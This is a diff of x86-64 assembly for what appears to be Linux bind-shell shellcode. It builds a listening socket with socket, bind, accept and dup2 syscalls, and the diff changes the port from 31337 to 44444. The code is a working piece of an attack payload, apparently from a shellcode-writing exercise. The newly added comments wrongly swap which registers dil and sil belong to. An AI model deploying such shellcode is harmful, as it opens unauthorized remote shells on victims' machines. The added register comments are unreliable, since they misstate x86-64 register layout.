@@ -3,21 +3,21 @@ BITS 64
 ;s = socket(2, 1, 0)
 push BYTE 0x29          ; socket syscall #41(0x29)
 pop rax
-mov dil, 0x2            ; AF_INET = 2
-mov sil, 0x1            ; SOCK_STREAM = 1
+mov dil, 0x2            ; AF_INET = 2 ; dil == low 8 bits of rsi
+mov sil, 0x1            ; SOCK_STREAM = 1 ; sil == low 8 bits of rdi
 xor rdx, rdx            ; protocol = 0
 syscall
 
 mov rbx, rax            ; store s(socket fd) in rbx
 
-;bind(s, [2, 31337, 0], 16)
+;bind(s, [2, 44444, 0], 16)
 push BYTE 0x31          ; bind syscall #49 (0x31)
 pop rax
 mov rdi, rbx
 xor rsi, rsi
 push rsi                ; sin_zero
 push rsi                ; build sockaddr struct: INADDR_ANY = 0
-push WORD 0x697a        ; (in reverse order) PORT = 31337
+push WORD 0x9cad        ; (in reverse order) PORT = 44444
 push WORD 0x2           ; AF_INET = 2
 mov rsi, rsp
 mov dl, 16             ; sizeof(struct sockaddr)
@@ -43,7 +43,7 @@ push DWORD 16
 mov rdx, rsp
 syscall
 
-; dup2(int oldfd, int newjd)
+; dup2(int oldfd, int newfd)
 mov rdi, rax 		; sockfd of newly accepted connection
 push BYTE 0x21
 pop rax
